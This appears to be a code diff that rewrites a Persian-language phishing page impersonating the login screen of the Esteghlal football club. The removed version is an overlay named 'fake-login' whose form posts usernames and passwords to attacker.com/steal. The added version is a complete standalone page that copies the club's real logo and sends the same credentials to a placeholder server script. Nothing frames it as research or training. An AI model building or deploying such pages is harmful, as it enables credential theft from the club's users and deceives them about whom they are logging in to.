@@ -1,37 +1,55 @@
-<div id="fake-login">
-  <img src="/wp-content/themes/esteghlal/images/logo.png" width="150">
-  <h2>ورود به حساب کاربری</h2>
-  <form action="http://attacker.com/steal" method="POST">
-    <input type="text" name="username" placeholder="نام کاربری">
-    <input type="password" name="password" placeholder="رمز عبور">
-    <button type="submit">ورود</button>
-  </form>
-</div>
-
-<style>
-  body {
-    background: #004080; /* رنگ استقلال :) */
-    font-family: IranYekan, sans-serif;
-    margin: 0;
-    padding: 0;
-  }
-
-  #fake-login {
-    position: fixed;
-    top: 20%;
-    left: 50%;
-    transform: translate(-50%, -20%);
-    background: white;
-    padding: 30px;
-    border-radius: 10px;
-    box-shadow: 0 0 10px #000;
-    text-align: center;
-  }
-
-  input, button {
-    display: block;
-    width: 250px;
-    padding: 10px;
-    margin: 10px auto;
-  }
-</style>
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <title>ورود به حساب کاربری | باشگاه استقلال</title>
+  <style>
+    body {
+      background-color: #0033A0;
+      color: white;
+      font-family: sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding-top: 100px;
+    }
+    .login-box {
+      background: white;
+      color: #0033A0;
+      padding: 30px;
+      border-radius: 10px;
+      width: 300px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+    }
+    input {
+      width: 100%;
+      margin: 10px 0;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    input[type=submit] {
+      background-color: #0033A0;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    img {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://fcesteghlal.ir/wp-content/uploads/2023/04/logo-blue.png" alt="لوگو استقلال" />
+  <div class="login-box">
+    <form action="http://yourserver.com/log.php" method="POST">
+      <label>نام کاربری:</label>
+      <input type="text" name="username" required />
+      <label>رمز عبور:</label>
+      <input type="password" name="password" required />
+      <input type="submit" value="ورود">
+    </form>
+  </div>
+</body>
+</html>
